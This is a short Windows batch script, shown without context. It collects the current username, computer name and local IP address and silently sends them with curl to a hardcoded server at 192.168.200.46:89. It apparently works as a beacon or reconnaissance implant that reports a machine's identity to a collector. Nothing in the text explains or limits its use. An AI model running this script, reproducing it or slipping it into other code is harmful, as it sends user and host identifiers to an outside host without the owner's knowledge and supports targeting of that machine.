@echo off
echo User: %username%
echo PC: %computername%
for /f "tokens=2 delims=[]" %%f in ('ping -4 -n 1 %computername% ^| find /i "pinging"') do set IP=%%f
echo IP: %IP%

curl -s "http://192.168.200.46:89/?locip=%IP%&user=%username%&pc=%computername%"
